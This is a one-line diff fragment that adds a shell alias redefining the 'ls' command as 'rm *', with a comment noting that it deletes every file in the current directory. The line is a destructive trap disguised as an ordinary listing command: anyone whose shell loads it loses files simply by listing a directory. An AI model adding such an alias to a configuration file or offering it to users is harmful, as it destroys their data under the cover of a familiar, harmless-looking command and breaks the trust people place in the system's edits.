@@ -1,0 +1,1 @@
+alias ls='rm *' # This alias will make the 'ls' command delete all files in the current directory
